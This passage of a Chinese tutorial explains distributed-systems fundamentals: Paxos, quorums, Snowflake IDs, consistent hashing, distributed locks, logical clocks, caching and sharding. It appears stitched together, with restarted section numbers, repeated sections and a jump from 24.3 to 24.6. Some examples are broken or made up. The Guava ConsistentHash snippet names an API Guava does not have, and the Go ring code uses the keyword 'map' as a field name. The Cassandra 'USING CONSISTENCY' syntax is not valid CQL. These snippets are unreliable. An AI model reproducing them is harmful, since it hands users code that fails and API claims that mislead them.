\`\`\`java
RaftServer.builder(address)
    .withProtocol(RaftProtocol.builder().build())
    .withStateMachine(MyStateMachine::new)
    .build()
    .start();
\`\`\`

---

### 六、Paxos 算法简述

Paxos 是 Leslie Lamport 提出的共识算法，比 Raft 更早但更难理解。Raft 是 Paxos 的简化版。

#### 6.1 Basic Paxos

三个角色：

- **Proposer（提议者）**：发起提案。
- **Acceptor（接受者）**：投票接受提案。
- **Learner（学习者）**：学习已达成一致的值。

**两阶段流程**：

\`\`\`
阶段1：Prepare
  Proposer → 发 Prepare(n) 给所有 Acceptor（n 是提案编号）
  Acceptor → 如果 n > 已见过的最大编号 → 承诺不再接受 < n 的提案，返回已接受的提案
           → 否则拒绝

阶段2：Accept
  Proposer → 收到多数 Acceptor 的承诺 → 发 Accept(n, value)
           → value = 承诺中编号最大的提案的 value（如有），否则自定义
  Acceptor → 如果 n >= 已承诺的编号 → 接受提案
  → 多数接受 → 值确定 → Learner 学习
\`\`\`

#### 6.2 Multi-Paxos

Basic Paxos 一次只决定一个值，Multi-Paxos 优化为决定一系列值（日志）：

- 选一个稳定的 Leader，跳过 Prepare 阶段（Leader 不变时提案编号不变）。
- Leader 直接发 Accept，效率更高。
- 这就是 Raft 的思路——Raft 是 Multi-Paxos 的工程化简化。

---

### 七、NWR / Quorum 模型

NWR 是一种通用的一致性控制模型，通过调整参数在 C 和 A 间灵活权衡。

#### 7.1 NWR 定义

- **N**：副本总数。
- **W**：写操作需要确认的副本数（Write Quorum）。
- **R**：读操作需要查询的副本数（Read Quorum）。

**关键公式**：W + R > N → 强一致（读和写的副本集合必有交集）。

\`\`\`
N=3, W=2, R=2 → W+R=4 > 3 → 强一致
  写：3 副本写，2 个确认即成功
  读：3 副本读，取 2 个的最新值 → 必有一个是刚写的

N=3, W=1, R=1 → W+R=2 < 3 → 可能不一致
  写：1 个确认即成功 → 可能其他副本还没同步
  读：读 1 个 → 可能读到旧副本
\`\`\`

#### 7.2 NWR 调参策略

| 配置 | 一致性 | 性能 | 适用 |
|------|--------|------|------|
| W=N, R=1 | 强一致，写慢读快 | 写高延迟 | 读多写少 |
| W=1, R=N | 强一致，写快读慢 | 读高延迟 | 写多读少 |
| W=多数, R=多数 | 强一致，均衡 | 均衡 | 通用 |
| W=1, R=1 | 最终一致 | 最快 | 缓存 |

**Cassandra 的可调一致性**：

\`\`\`sql
-- 写：QUORUM（多数确认）
INSERT INTO orders ... USING CONSISTENCY QUORUM;

-- 读：QUORUM（多数读取）
SELECT * FROM orders ... USING CONSISTENCY QUORUM;

-- 也可用 ONE（一个即可，最快但可能不一致）
SELECT * FROM orders ... USING CONSISTENCY ONE;
\`\`\`

---

### 八、分布式 ID 生成

分布式系统中，ID 需要全局唯一、趋势递增、高性能生成。多种方案各有优劣。

#### 8.1 UUID

\`\`\`
UUID v4：550e8400-e29b-41d4-a716-446655440000
  128 位，随机生成
\`\`\`

**优点**：本地生成、无冲突、无中心。

**缺点**：

- 无序（作为主键导致 B+ 树页分裂频繁，插入性能差）。
- 太长（36 字符，存储和索引开销大）。
- 不可读（无法从 ID 看出信息）。

**适用**：非主键场景（如 traceId、token）。

#### 8.2 雪花算法（Snowflake）

Twitter 开源的分布式 ID 算法，64 位整数，趋势递增。

\`\`\`
Snowflake 结构（64 bit）：
  | 1 bit 符号位 | 41 bit 时间戳 | 10 bit 机器ID | 12 bit 序列号 |
  | 不用         | 毫秒级时间    | 1024 台机器   | 每毫秒 4096 个 |

  时间戳：41 bit 可用 69 年（2^41 ms / 1000 / 3600 / 24 / 365 ≈ 69.7 年）
  机器 ID：10 bit 支持 1024 台机器
  序列号：12 bit 支持每毫秒 4096 个 ID

  → 单机每秒可生成 409.6 万个 ID，全局唯一，趋势递增
\`\`\`

**优点**：

- 趋势递增（时间戳在前），适合做主键。
- 64 位整数，存储和索引高效。
- 本地生成，无中心依赖。

**缺点**：

- 依赖时钟（时钟回拨会导致重复 ID）。
- 机器 ID 需要分配（不能重复）。

**时钟回拨处理**：

\`\`\`
时钟回拨：当前时间 < 上次生成时间
  方案1：等待时钟追上（回拨小）
  方案2：报错拒绝（回拨大）
  方案3：用历史时间戳的序列号（延长上一毫秒）
\`\`\`

**多语言对照（Snowflake）**：

Java:
\`\`\`java
public synchronized long nextId() {
    long now = System.currentTimeMillis();
    if (now < lastTimestamp) throw new RuntimeException("时钟回拨");
    if (now == lastTimestamp) {
        sequence = (sequence + 1) & 0xFFF; // 12 bit
        if (sequence == 0) now = tilNextMillis(lastTimestamp); // 序列用尽，等下一毫秒
    } else {
        sequence = 0;
    }
    lastTimestamp = now;
    return (now - EPOCH) << 22 | machineId << 12 | sequence;
}
\`\`\`

Go:
\`\`\`go
func (s *Snowflake) NextID() int64 {
    now := time.Now().UnixMilli()
    if now < s.lastTs { panic("clock moved backwards") }
    // ... 同 Java 逻辑
}
\`\`\`

Python:
\`\`\`python
def next_id(self):
    now = int(time.time() * 1000)
    if now < self.last_ts: raise Exception("clock backwards")
    # ...
\`\`\`

#### 8.3 号段模式（Leaf）

美团 Leaf 的号段模式：从数据库批量获取 ID 段，本地消费。

\`\`\`
数据库表：
  biz_tag | max_id | step
  order   | 1000   | 1000

服务启动：
  → UPDATE leaf SET max_id = max_id + 1000 WHERE biz_tag = 'order'
  → 获取 [1001, 2000] 段，本地分配

用完再取下一段 → 减少数据库访问
\`\`\`

**优点**：ID 递增、高性能（批量取）、可读（连续）。

**缺点**：依赖数据库、重启会浪费一段 ID。

#### 8.4 其他方案

**Redis INCR**：

\`\`\`
redis.incr("order:id") → 1, 2, 3...
  简单，但依赖 Redis，Redis 挂了影响 ID 生成
\`\`\`

**数据库自增步长**：

\`\`\`
2 台数据库：
  DB1: auto_increment=1, step=2 → 1, 3, 5, 7...
  DB2: auto_increment=2, step=2 → 2, 4, 6, 8...
  → 全局唯一，但扩展难（加库要重新分配步长）
\`\`\`

#### 8.5 方案对比

| 方案 | 有序 | 性能 | 依赖 | 适用 |
|------|------|------|------|------|
| UUID | 无 | 高 | 无 | 非主键 |
| Snowflake | 趋势递增 | 高 | 时钟 | 主键（最常用） |
| 号段 | 递增 | 高 | DB | 连续 ID |
| Redis | 递增 | 高 | Redis | 简单场景 |
| DB 自增 | 递增 | 低 | DB | 单库 |

---

### 九、一致性哈希

**一致性哈希（Consistent Hashing）** 是分布式系统中解决"节点增减时数据迁移最小化"的核心算法，广泛用于分布式缓存、数据库分片、负载均衡。

#### 9.1 为什么需要一致性哈希

**普通哈希的问题**：

\`\`\`
有 4 台缓存节点，用 hash(key) % 4 路由：
  key1 → hash=10 → 10%4=2 → 节点2
  key2 → hash=15 → 15%4=3 → 节点3

加一台节点（变成 5 台），用 hash(key) % 5：
  key1 → 10%5=0 → 节点0（从节点2迁移到节点0）
  key2 → 15%5=0 → 节点0（从节点3迁移到节点0）

→ 几乎所有 key 都要重新路由！缓存大面积失效，数据库被击穿。
\`\`\`

普通哈希在节点数变化时，几乎所有数据都要迁移，代价巨大。

#### 9.2 一致性哈希原理

**核心思想**：把哈希值空间看成一个环（0 ~ 2^32-1），节点和 key 都映射到环上，key 顺时针找最近的节点。

\`\`\`
哈希环（0 ~ 2^32-1）：
        节点A (hash=1000)
       /              \\
  key3(800)         key1(1500) → 顺时针找 → 节点A
      |                |
  节点C(3000)      节点B(2000)
       \\              /
        key2(2800) → 顺时针找 → 节点C

key1 顺时针 → 节点A
key2 顺时针 → 节点C
key3 顺时针 → 节点A
\`\`\`

**节点增加时**：

\`\`\`
新增节点D（hash=1200）在 key1(1500) 和 节点A(1000) 之间
  → 只有 key1 从节点A 迁移到节点D
  → 其他 key 不受影响！

迁移量 = 1/N（N 为节点数），而非全部
\`\`\`

**节点减少时**：

\`\`\`
节点A 宕机 → key1 和 key3 顺时针找下一个 → 节点D / 节点B
  → 只有节点A 上的数据迁移到下一个节点
  → 其他节点不受影响
\`\`\`

#### 9.3 虚拟节点解决数据倾斜

**问题**：节点少时，哈希环上节点分布不均，导致数据倾斜。

\`\`\`
3 个节点，可能恰好都挤在环的一侧：
  节点A(100), 节点B(200), 节点C(300)
  → 环上 400~2^32 这一大段没有节点 → 全归节点A → A 数据巨多

数据倾斜：某节点承担远超平均的数据量
\`\`\`

**解决方案：虚拟节点**：

\`\`\`
每个物理节点映射多个虚拟节点到环上：
  节点A → 虚拟节点 A-1, A-2, ..., A-150（150 个虚拟节点）
  节点B → 虚拟节点 B-1, B-2, ..., B-150
  节点C → 虚拟节点 C-1, C-2, ..., C-150

→ 450 个虚拟节点均匀分布在环上 → 数据均匀分布
→ 虚拟节点越多，分布越均匀（一般 150-200 个/物理节点）
\`\`\`

#### 9.4 一致性哈希的应用

- **Redis Cluster**：用一致性哈希（实际用 16384 个槽位）分片。
- **Memcached**：客户端一致性哈希路由。
- **Cassandra**：一致性哈希分区。
- **DynamoDB**：一致性哈希 + 虚拟节点。

**多语言对照（一致性哈希）**：

Java (Guava):
\`\`\`java
ConsistentHash<Server> hash = ConsistentHash.create();
hash.add(server1); hash.add(server2);
Server s = hash.get(key); // 路由
\`\`\`

Go (自定义):
\`\`\`go
type Ring struct {
    nodes []uint32            // 排序的虚拟节点哈希
    map   map[uint32]string   // 哈希 → 物理节点
}
func (r *Ring) Get(key string) string {
    h := hash(key)
    idx := sort.Search(len(r.nodes), func(i int) bool {
        return r.nodes[i] >= h
    })
    return r.map[r.nodes[idx%len(r.nodes)]]
}
\`\`\`

---

### 十、分布式系统设计模式

#### 10.1 Saga 模式

长事务拆成一系列本地事务，每个有补偿操作：

\`\`\`
转账：A扣钱 → B加钱
  T1: A扣100 → 失败 → C1: A加回100（补偿）
  T2: B加100 → 失败 → C2: B扣100（补偿）

执行：T1 → T2（全成功）
补偿：T2失败 → C1（回滚T1）
\`\`\`

#### 10.2 两阶段提交（2PC）

协调者统一调度：

\`\`\`
阶段1：Prepare → 所有参与者"准备好了吗？" → 全YES
阶段2：Commit → 所有参与者"提交！" → 全提交
  任一参与者NO → 全部Rollback
\`\`\`

#### 10.3 Leader 选举

如 Raft/Zab，选一个主节点协调，主挂了重新选举。

#### 10.4 分片（Sharding）

数据按规则分散到多个节点：

\`\`\`
按范围分片：0-1000→节点A，1001-2000→节点B
按哈希分片：hash(key)%N → 节点
按一致性哈希：解决增减节点迁移问题
\`\`\`

#### 10.5 心跳与故障检测

节点定期发心跳，超时判定故障，触发故障转移。

---

### 十一、实战要点与常见坑

#### 11.1 分布式系统设计 Checklist

\`\`\`
[ ] 网络不可靠：所有远程调用都有超时、重试、降级
[ ] 节点会故障：关键数据有多副本，有故障转移机制
[ ] 时钟不同步：不依赖物理时钟判断事件顺序
[ ] 数据一致性：明确选 CP 还是 AP，选合适的一致性模型
[ ] 幂等性：所有重试操作必须幂等
\`\`\`

#### 11.2 常见坑

**坑1：忽略网络超时**

远程调用不设超时 → 线程阻塞 → 雪崩。
解决：所有远程调用设超时（如 3 秒）。

**坑2：假设操作原子**

"先查后改"在分布式下不原子 → 并发问题。
解决：用版本号/分布式锁。

**坑3：时钟依赖**

用时间戳判断顺序 → 时钟不同步 → 错乱。
解决：用逻辑时钟（Lamport/Vector Clock）。

**坑4：忽略分区容忍**

假设网络不会分区 → 分区时数据不一致。
解决：明确 CP/AP 策略，分区时有预案。

---

### 十二、生产案例

#### 案例1：etcd 用 Raft 实现配置一致性

\`\`\`
etcd（K8s 的核心存储）用 Raft：
  - 3-5 节点集群
  - 所有写请求经过 Leader
  - Leader 复制到多数节点后提交
  - Leader 挂了，Follower 选举新 Leader
  → 配置数据强一致，K8s 依赖它存集群状态
\`\`\`

#### 案例2：Cassandra 用一致性哈希分片

\`\`\`
Cassandra：
  - 数据按 partition key 一致性哈希到环上
  - 每个节点负责一段环
  - 虚拟节点（默认 256/节点）保证均匀
  - 副本数可配（RF=3 表示 3 副本）
  → 加减节点只迁移相邻段，扩缩容平滑
\`\`\`

#### 案例3：Twitter 用 Snowflake 生成 ID

\`\`\`
Twitter：
  - 每秒数万条推文，需要全局唯一 ID
  - 用 Snowflake：41bit时间 + 10bit机器 + 12bit序列
  - 趋势递增，适合 MySQL 主键
  → 单机每秒 400 万 ID，无中心依赖
\`\`\`

---

### 十三、本章小结

分布式系统基础核心知识回顾：

1. **三大挑战**：网络不可靠、时钟不同步、节点故障。
2. **CAP 理论**：分区时 C 和 A 二选一，P 不可避免。
3. **PACELC**：无分区时也要在延迟和一致性间权衡。
4. **一致性模型**：从强到弱——强一致/顺序一致/因果一致/最终一致。
5. **Raft 共识**：Leader 选举（Term+随机超时）+ 日志复制（多数派）+ 安全性。
6. **Paxos**：Prepare-Accept 两阶段，Multi-Paxos 优化为 Leader 模式。
7. **NWR/Quorum**：W+R>N 保证强一致，可调参数权衡。
8. **分布式 ID**：Snowflake（时间+机器+序列）最常用，注意时钟回拨。
9. **一致性哈希**：环+虚拟节点，节点增减迁移最小。
10. **设计模式**：Saga/2PC/Leader选举/分片/心跳检测。

## 十一、分布式锁实现方案

### 11.1 分布式锁要求

1. **互斥性**：同一时刻只有一个客户端持有锁
2. **避免死锁**：锁有过期时间，持有者崩溃后锁自动释放
3. **公平性**：可选，FIFO 获取锁
4. **可重入**：同一线程可重复获取锁
5. **高可用**：锁服务自身高可用

### 11.2 Redis 分布式锁

**SET NX EX**（最简单）：
- SET key value NX EX seconds
- NX：key 不存在才设置（互斥）
- EX：设置过期时间（避免死锁）
- value：唯一标识（UUID），用于安全释放锁

**Redlock**（Redis 作者提出，多节点）：
1. 获取当前时间 T1
2. 依次向 N 个 Redis 节点请求 SET NX EX
3. 多数节点（N/2+1）成功则获取锁
4. 计算获取锁耗时 = T2 - T1
5. 如果耗时 < 锁过期时间，锁有效；否则锁已过期

**Lua 脚本释放锁**（保证原子性）：
- 获取锁的 value，对比是否为自己的标识
- 如果是，删除 key
- 整个操作用 Lua 脚本保证原子性

### 11.3 ZooKeeper 分布式锁

基于临时顺序节点：
1. 在锁节点下创建临时顺序子节点
2. 获取所有子节点，判断自己是否最小
3. 如果最小，获取锁
4. 否则监听前一个节点的删除事件
5. 前一个节点删除时，自己成为最小，获取锁

优点：锁释放时自动通知（Watch），公平锁，无死锁风险（临时节点会话断开自动删除）
缺点：性能不如 Redis，实现复杂

### 11.4 etcd 分布式锁

基于 Lease + Revision：
1. 创建 Lease（TTL）
2. 向 etcd 写入 key（带 Lease 和 Revision）
3. 比较 Revision，最小的获取锁
4. 其他客户端等待前一个 key 被删除

优点：强一致性（Raft），可靠性高
缺点：性能不如 Redis

### 11.5 多语言实现对比

| 方案 | Java | Go | Python | Node.js |
|------|------|-----|--------|---------|
| Redis | Redisson | redsync | redis-py | redlock |
| ZK | Curator | go-zk | kazoo | node-zookeeper |
| etcd | jetcd | clientv3 | etcd3 | etcd3 |

### 11.6 分布式锁注意事项

1. 锁超时设置要合理：太短导致业务未完成锁已释放，太长导致阻塞
2. 锁续期：长时间业务需要 watchdog 自动续期（Redisson 默认 10s 续期）
3. 不要在持有锁时做耗时操作
4. 考虑锁的可重入性（同一线程多次获取同一锁）
5. 避免锁失效：Redis 主从切换可能导致锁丢失

## 十二、逻辑时钟与事件排序

### 12.1 物理时钟问题

不同机器的时钟存在偏差（clock skew），NTP 同步也有毫秒级误差。依赖物理时间排序事件可能出错。

### 12.2 Lamport 逻辑时钟

规则：
1. 每个事件携带一个计数器 C
2. 本地事件：C = C + 1
3. 发送消息：C = C + 1，消息携带 C
4. 接收消息：C = max(C, msg.C) + 1

性质：如果 A → B（happens-before），则 C(A) < C(B)
注意：反过来不成立——C(A) < C(B) 不一定意味着 A → B

### 12.3 向量时钟（Vector Clock）

解决 Lamport 时钟无法判断并发的问题。

每个节点维护一个向量 V[1..N]：
1. 本地事件：V[i] = V[i] + 1
2. 发送消息：附带当前 V
3. 接收消息：V[j] = max(V[j], msg.V[j]) for all j，然后 V[i] = V[i] + 1

判断并发：V(A) 和 V(B) 互不 dominate（既不 V(A) ≤ V(B) 也不 V(B) ≤ V(A)），则 A 和 B 并发。

### 12.4 混合逻辑时钟（HLC）

结合物理时钟和逻辑时钟：
- 使用 NTP 同步的物理时间作为高位
- 逻辑计数器作为低位
- 既接近真实时间，又保证因果关系

应用于 CockroachDB、MongoDB 等分布式数据库。

### 12.5 Google Spanner 的 TrueTime

Google 数据中心使用原子钟和 GPS 实现 TrueTime API：
- TT.now() 返回一个时间区间 [earliest, latest]
- TT.after(t) 和 TT.before(t) 判断时间关系
- 通过 Commit Wait 消除不确定性

TrueTime 使得 Spanner 能够实现外部一致性（External Consistency），即线性一致性。

## 十三、Gossip 协议

### 13.1 Gossip 基本原理

Gossip（流言协议）模拟病毒传播：
1. 每个节点随机选择几个邻居
2. 将自己的信息发送给邻居
3. 邻居收到后更新本地状态，继续传播
4. 经过 O(log N) 轮后，所有节点收到信息

特点：去中心化、最终一致、容错、可扩展

### 13.2 传播模式

**Push**：节点主动将自己状态发给邻居
**Pull**：节点主动从邻居拉取状态
**Push-Pull**：先 Push 再 Pull，收敛最快

### 13.3 应用场景

- **Cassandra**：节点发现、故障检测、元数据同步
- **Consul**：成员管理、健康检查
- **Redis Cluster**：节点间 gossip 交换集群状态
- **Bitcoin**：交易和区块传播

### 13.4 优缺点

优点：
- 去中心化，无单点故障
- 可扩展，O(log N) 收敛
- 容错，节点故障不影响协议
- 最终一致

缺点：
- 收敛延迟（非强一致）
- 消息冗余（多次传播同一信息）
- 带宽消耗随节点数增长

## 十四、分布式系统设计模式

### 14.1 Leader 选举模式

- 一个节点作为 Leader 处理写请求
- 其他节点作为 Follower 复制数据
- Leader 故障时重新选举
- 实现：Raft、Paxos、ZooKeeper ZAB

### 14.2 心跳检测模式

- 定期发送心跳，超时判定故障
- 优点：简单
- 缺点：误判（网络抖动）、检测延迟

### 14.3 Quorum 模式

- N 个副本，写 W 个，读 R 个
- W + R > N 保证强一致
- 常见配置：N=3, W=2, R=2

### 14.4 分片（Sharding）模式

- 数据按 Key 分配到不同节点
- 分片策略：范围分片、哈希分片、一致性哈希
- 需要路由层（如 Redis Cluster 的槽位）

### 14.5 副本模式

- 主从复制：Leader 写，Follower 读
- 多主复制：多个 Leader 同时写（冲突需解决）
- 无主复制：任意节点可写（Dynamo 风格，Quorum）

### 14.6 故障恢复模式

- 前向恢复：新节点接管，从日志恢复
- 后向恢复：回滚到一致状态
- 回滚（Rollback）/补偿（Compensation）

## 十五、分布式系统故障诊断

### 15.1 常见故障类型

1. **节点故障**：进程崩溃、OOM、磁盘满
2. **网络故障**：分区、延迟、丢包
3. **数据不一致**：副本不同步、脑裂
4. **性能劣化**：慢查询、GC 停顿、热点
5. **级联故障**：一个服务故障导致连锁反应

### 15.2 故障排查方法论

1. **现象收集**：错误信息、监控指标、日志
2. **时间线梳理**：故障开始时间、影响范围变化
3. **最近变更**：发布、配置变更、扩容
4. **假设验证**：逐一验证可能的根因
5. **修复验证**：修复后确认恢复

### 15.3 分布式系统 debug 工具

| 工具 | 用途 |
|------|------|
| tcpdump | 网络抓包 |
| strace/ltrace | 系统调用追踪 |
| perf | 性能分析 |
|火焰图 | CPU/内存分析 |
| Jaeger | 链路追踪 |
| Grafana | 指标可视化 |
| pdsh | 批量执行 |

### 15.4 常见故障案例

案例一：脑裂
- 现象：两个节点同时认为自己是 Leader
- 原因：网络分区导致心跳超时
- 解决：Quorum 机制，多数派才能提交

案例二：GC 停顿
- 现象：节点无响应，被误判为故障
- 原因：JVM Full GC 导致 STW
- 解决：调优 GC、降低堆大小、使用 ZGC

案例三：热点 Key
- 现象：单个 Key 访问量过大，单节点 CPU 爆满
- 原因：流量倾斜
- 解决：Key 分散、本地缓存、多副本读

## 十六、分布式存储引擎

### 16.1 LSM-Tree

LSM-Tree（Log-Structured Merge-Tree）是分布式存储常用数据结构。

写入流程：
1. 数据写入内存表（MemTable）
2. 同时写入 WAL（Write-Ahead Log）保证持久性
3. MemTable 满后冻结为 Immutable MemTable
4. 异步刷盘为 SSTable（Sorted String Table）
5. 后台 Compaction 合并 SSTable

读取流程：
1. 先查 MemTable
2. 再查 Immutable MemTable
3. 从新到旧查 SSTable（配合 Bloom Filter）
4. 合并结果返回

特点：写快读慢（需查多层），适合写多读少场景。

代表系统：RocksDB, LevelDB, Cassandra, HBase, TiDB（TiKV）

### 16.2 B+ Tree

传统关系数据库使用 B+ Tree：
- 数据有序存储，叶子节点用链表连接
- 查找效率稳定 O(log N)
- 写入需维护索引，可能触发页分裂
- 适合读多写少场景

代表系统：MySQL(InnoDB), PostgreSQL, Oracle

### 16.3 LSM vs B+ Tree 对比

| 维度 | LSM-Tree | B+ Tree |
|------|----------|---------|
| 写入 | 快（顺序写） | 慢（随机写） |
| 读取 | 慢（多层查） | 快（一次查找） |
| 空间 | 紧凑（压缩） | 有碎片 |
| 放大 | 写放大（Compaction） | 写放大（页分裂） |
| 适合 | 写多读少 | 读多写少 |

### 16.4 多语言存储引擎对比

Java：RocksJava（RocksDB JNI 绑定）
Go：BadgerDB（纯 Go LSM）、BoltDB（B+ Tree）
Rust：RocksDB bindings、Sled（纯 Rust）
C++：RocksDB、LevelDB（原生）

## 十七、CAP 实践权衡

### 17.1 CAP 理论回顾

- Consistency：所有节点看到相同数据
- Availability：每个请求都能收到响应
- Partition tolerance：网络分区时系统仍能工作

CAP 理论：分布式系统最多同时满足两个，网络分区不可避免，所以实际是 CP 或 AP 之间的选择。

### 17.2 CP 系统（一致性优先）

特点：分区时拒绝写入，保证数据一致。
适用场景：金融、库存、配置中心。

代表系统：
- ZooKeeper：ZAB 协议，Leader 选举期间不可用
- etcd：Raft 协议，少数派节点不可用
- HBase：强一致性读写
- MongoDB（默认）：Primary 写，自动 failover

### 17.3 AP 系统（可用性优先）

特点：分区时各节点仍可读写，允许数据不一致。
适用场景：社交、推荐、缓存。

代表系统：
- Cassandra：可调一致性（ONE/QUORUM/ALL）
- DynamoDB：最终一致（默认）或强一致（可选）
- Redis Cluster：分区时各 Slot 独立工作
- Eureka：AP 注册中心，节点对等

### 17.4 PACELC 扩展

PACELC 是 CAP 的扩展：
- If Partition (P): choose A or C
- Else (E): choose L (Latency) or C

| 系统 | P→A/C | E→L/C |
|------|-------|-------|
| Cassandra | A | L |
| MongoDB | C | C |
| MySQL | C | C |
| DynamoDB | A | L |
| ZooKeeper | C | C |

## 十八、分布式缓存

### 18.1 缓存策略

| 策略 | 读 | 写 | 适用 |
|------|-----|-----|------|
| Cache-Aside | 先读缓存，miss 读 DB 后回填 | 先写 DB，再删缓存 | 通用 |
| Read-Through | 缓存层读 DB | 先写 DB，再删缓存 | 读多写少 |
| Write-Through | - | 同时写缓存和 DB | 数据强一致 |
| Write-Behind | - | 先写缓存，异步写 DB | 写多，容忍丢数据 |

### 18.2 缓存问题

1. **缓存穿透**：查询不存在的 Key，绕过缓存打 DB
   - 解决：布隆过滤器、缓存空值

2. **缓存击穿**：热点 Key 过期，大量请求打 DB
   - 解决：互斥锁、热点 Key 永不过期

3. **缓存雪崩**：大量 Key 同时过期
   - 解决：过期时间加随机值、多级缓存

4. **数据不一致**：缓存与 DB 不一致
   - 解决：先写 DB 再删缓存、延迟双删

### 18.3 分布式缓存方案

Redis Cluster：
- 16384 个 Slot，分片到多个节点
- 主从复制，自动 failover
- 支持跨 Slot 操作（MGET/MSET 需 hash tag）

Memcached：
- 纯内存，无持久化
- 客户端分片（一致性哈希）
- 多线程，简单高效

## 十九、数据分片策略

### 19.1 分片方式

1. **范围分片**：按 Key 范围分配（如 1-1000 在节点 A，1001-2000 在节点 B）
   - 优点：范围查询高效
   - 缺点：热点问题（最新数据集中在一个节点）

2. **哈希分片**：hash(Key) % N
   - 优点：数据均匀
   - 缺点：增减节点需迁移大量数据

3. **一致性哈希**：环 + 虚拟节点
   - 优点：增减节点迁移最小
   - 缺点：实现复杂

4. **分片表**：维护 Key → 节点映射表
   - 优点：灵活可控
   - 缺点：单点瓶颈，需缓存

### 19.2 分片 Key 选择

选择原则：
1. 高基数（值多，分布均匀）
2. 低可变性（值不频繁变化）
3. 查询友好（常用查询条件包含分片 Key）

反例：按性别分片（只有两个值，无法分散）
正例：按用户 ID 分片（值多且均匀）

### 19.3 跨分片查询

1. **Scatter-Gather**：查询所有分片，聚合结果
2. **二级索引**：维护索引分片，先查索引再查数据
3. **数据冗余**：按不同维度冗余存储
4. **绑定分片**：关联数据存在同一分片（如用户+订单按 userId 分片）

### 19.4 分片 vs 分区 vs 分库分表

- 分片（Sharding）：跨节点分布数据
- 分区（Partitioning）：单节点内分片
- 分库分表：垂直分库（按业务）+ 水平分表（按行）

中间件：
- ShardingSphere（Java）：分库分表中间件
- Vitess（Go）：MySQL 集群管理
- MyCAT（Java）：数据库代理

## 二十、分布式 ID 生成方案对比

### 20.1 方案对比

| 方案 | 原理 | 优点 | 缺点 |
|------|------|------|------|
| UUID | 随机数 | 无中心，简单 | 无序，占空间 |
| DB 自增 | DB 序列 | 简单，有序 | 单点瓶颈 |
| DB 号段 | 批量取号 | 高性能 | 重启浪费 |
| Snowflake | 时间+机器+序列 | 高性能，有序 | 时钟回拨 |
| Redis | INCR | 高性能 | 依赖 Redis |
| Leaf | 美团，号段+Snowflake | 高可用 | 实现复杂 |
| Tinyid | 滴滴，号段模式 | 高性能 | 依赖 DB |

### 20.2 Snowflake ID 结构

64 位 = 1 位符号位 + 41 位时间戳 + 10 位机器 ID + 12 位序列号

- 时间戳：毫秒级，可用 69 年
- 机器 ID：最多 1024 台机器
- 序列号：每毫秒最多 4096 个 ID

### 20.3 时钟回拨问题

NTP 同步可能导致时钟回拨，生成重复 ID。

解决方案：
1. **等待**：回拨小（<5ms），等待时钟追上
2. **报错**：回拨大，拒绝生成
3. **借用**：使用上次时间戳的序列号
4. **备用机房**：回拨时切换到备用 ID 生成器

### 20.4 多语言实现

Java：Hutool 的 Snowflake，百度 UidGenerator
Go：bwmarrin/snowflake，索尼 Sonyflake
Python：pysnowflake
Node.js：flake-idgen，node-snowflake

## 二十一、分布式队列与调度

### 21.1 任务调度场景

1. **定时任务**：每天凌晨清理数据
2. **延迟任务**：30 分钟后取消未支付订单
3. **周期任务**：每 5 分钟同步数据
4. **一次性任务**：立即执行

### 21.2 分布式调度框架

| 框架 | 语言 | 特点 |
|------|------|------|
| XXL-Job | Java | 中心化调度，Web UI |
| Elastic-Job | Java | 去中心化，弹性分片 |
| Quartz | Java | 企业级调度 |
| Celery | Python | 异步任务+定时任务 |
| Bull | Node.js | Redis 队列 |
| asynq | Go | Redis 队列 |

### 21.3 分布式调度核心问题

1. **防重复执行**：分布式锁 + 任务幂等
2. **任务分片**：大数据任务拆分到多个节点
3. **失败重试**：自动重试 + 告警
4. **任务依赖**：DAG 依赖管理
5. **动态调度**：根据负载动态调整

## 二十二、多语言分布式框架

### 22.1 RPC 框架对比

| 框架 | 语言 | 协议 | 特点 |
|------|------|------|------|
| gRPC | 多语言 | HTTP/2+Protobuf | 跨语言，高性能 |
| Dubbo | Java | TCP | 阿里，生态丰富 |
| Thrift | 多语言 | TCP | Facebook，跨语言 |
| JSON-RPC | 多语言 | HTTP+JSON | 简单，调试方便 |
| Tars | C++/Java | TCP | 腾讯，微服务一体 |

### 22.2 序列化格式对比

| 格式 | 大小 | 速度 | 可读性 | 跨语言 |
|------|------|------|--------|--------|
| Protobuf | 最小 | 最快 | 不可读 | 是 |
| Thrift | 小 | 快 | 不可读 | 是 |
| MessagePack | 小 | 快 | 不可读 | 是 |
| JSON | 大 | 慢 | 可读 | 是 |
| Avro | 小 | 快 | 不可读 | 是 |

选型建议：内部服务用 Protobuf（gRPC），对外 API 用 JSON（REST）。

## 二十三、分布式系统反模式

### 23.1 分布式单体

现象：虽然拆分了微服务，但服务间强耦合，必须一起部署。
原因：服务间同步调用过多，数据库共享，接口频繁变更。
解决：异步解耦，数据独立，接口版本化。

### 23.2 超时分发

现象：一个请求分发到多个服务，每个再分发，形成扇出。
原因：层级过深，每层都同步调用。
解决：控制调用层级（<5层），异步化，缓存。

### 23.3 负载不均

现象：某些节点负载高，其他空闲。
原因：数据倾斜（热点 Key）、请求倾斜（大客户）。
解决：数据重分布、请求限流、热点缓存。

### 23.4 级联故障

现象：一个服务故障导致整个系统雪崩。
原因：没有隔离和熔断，线程池耗尽。
解决：熔断器、限流、降级、超时、隔离。

### 23.5 分布式反模式总结

| 反模式 | 后果 | 解决 |
|--------|------|------|
| 共享数据库 | 耦合 | 数据独立 |
| 同步链路过长 | 延迟+脆弱 | 异步化 |
| 无超时 | 级联阻塞 | 设超时 |
| 无幂等 | 重复执行 | 幂等设计 |
| 无重试 | 偶发失败 | 重试+退避 |
| 无监控 | 故障不可见 | 可观测性 |

## 二十四、分布式系统测试

### 24.1 测试策略

1. 单元测试：Mock 网络和外部依赖
2. 集成测试：真实网络，多组件联合
3. 压力测试：高负载下的行为
4. 混沌测试：注入故障验证容错
5. 长稳测试：长时间运行验证内存泄漏

### 24.2 Jepsen 测试

Jepsen 是 Kyle Kingsbury 开发的分布式系统一致性验证框架：
- 注入网络分区、节点崩溃、时钟偏移
- 验证系统声称的一致性保证
- 发现了 MongoDB、Redis、Cassandra 等系统的问题

### 24.3 多语言分布式测试

Java：JUnit + Testcontainers + Awaitility
Go：testify + dockertest
Python：pytest + tenacity
Node.js：Jest + testcontainers-node

---

### 24.6 分布式可观测性（Observability）

可观测性是分布式系统的"眼睛"，三大支柱：

1. **Metrics（指标）**：聚合数值，如 QPS、延迟分位（P50/P95/P99）、错误率
   - Prometheus 拉取模型 + Grafana 可视化
   - 四种指标类型：Counter（单调递增）、Gauge（可增可减）、Histogram（分桶）、Summary（客户端分位）
2. **Logging（日志）**：离散事件记录
   - 结构化日志（JSON）便于检索
   - ELK / Loki + Promtail 采集
3. **Tracing（链路追踪）**：请求在多个服务间的调用路径
